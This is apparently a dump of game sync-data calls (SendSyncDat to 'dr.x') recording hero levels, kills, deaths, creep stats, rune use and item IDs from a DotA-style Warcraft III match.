	SendSyncDat("dr.x", "Data", "Level7", 9);
	SendSyncDat("dr.x", "Data", "Hero4", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 4);
	SendSyncDat("dr.x", "Data", "Assist8", 4);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level8", 3);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895874);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902281);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Assist9", 3);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level8", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "CSK1", 25);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 39);
	SendSyncDat("dr.x", "Data", "CSD7", 4);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 52);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 34);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 38);
	SendSyncDat("dr.x", "Data", "CSD3", 6);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 25);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 12);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 27);
	SendSyncDat("dr.x", "Data", "CSK10", 5);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 35);
	SendSyncDat("dr.x", "Data", "CSD5", 5);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 32);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Level8", 9);
	SendSyncDat("dr.x", "Data", "Hero5", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Assist11", 5);
	SendSyncDat("dr.x", "Data", "Level11", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227902265);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse5", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level9", 10);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "Level10", 8);
	SendSyncDat("dr.x", "Data", "Level9", 11);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227900744);
	SendSyncDat("dr.x", "Data", "Level11", 8);
	SendSyncDat("dr.x", "Data", "Hero4", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 4);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895863);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895863);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895890);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895890);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero4", 7);
	SendSyncDat("dr.x", "Data", "Level12", 7);
	SendSyncDat("dr.x", "Data", "Level10", 2);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero1", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "Assist9", 1);
	SendSyncDat("dr.x", "Data", "Level10", 5);
	SendSyncDat("dr.x", "Data", "Hero7", 5);
	SendSyncDat("dr.x", "Data", "Assist1", 7);
	SendSyncDat("dr.x", "Data", "Level11", 5);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "Hero2", 8);
	SendSyncDat("dr.x", "Data", "Assist9", 2);
	SendSyncDat("dr.x", "Data", "Level9", 9);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level11", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Level9", 3);
	SendSyncDat("dr.x", "Data", "Hero9", 3);
	SendSyncDat("dr.x", "Data", "Assist5", 9);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900760);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900760);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227901510);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895883);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "CSK1", 31);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 54);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 1);
	SendSyncDat("dr.x", "Data", "CSK2", 57);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 47);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 51);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 32);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 12);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 35);
	SendSyncDat("dr.x", "Data", "CSK10", 17);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 37);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 1);
	SendSyncDat("dr.x", "Data", "CSK11", 36);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896136);
	SendSyncDat("dr.x", "Data", "Level10", 3);
	SendSyncDat("dr.x", "Data", "Level10", 11);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist11", 3);
	SendSyncDat("dr.x", "Data", "Level13", 7);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895896);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895896);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895895);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895895);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900760);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse2", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero7", 0);
	SendSyncDat("dr.x", "Data", "Assist4", 7);
	SendSyncDat("dr.x", "Data", "Assist5", 7);
	SendSyncDat("dr.x", "Data", "Level9", 4);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227900744);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Level11", 11);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Hero4", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 4);
	SendSyncDat("dr.x", "Data", "Level12", 8);
	SendSyncDat("dr.x", "Data", "Hero5", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Level11", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Tower012", 9);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "Level9", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895877);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896916);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900976);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900976);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900976);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse3", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896921);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896921);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "RuneUse6", 1);
	SendSyncDat("dr.x", "Data", "PUI_1", 0);
	SendSyncDat("dr.x", "Data", "DRI_1", 0);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "Level13", 8);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895892);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895888);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227899469);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227903025);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895892);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level12", 5);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Level10", 9);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895895);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895863);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896911);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896921);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level14", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227900746);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
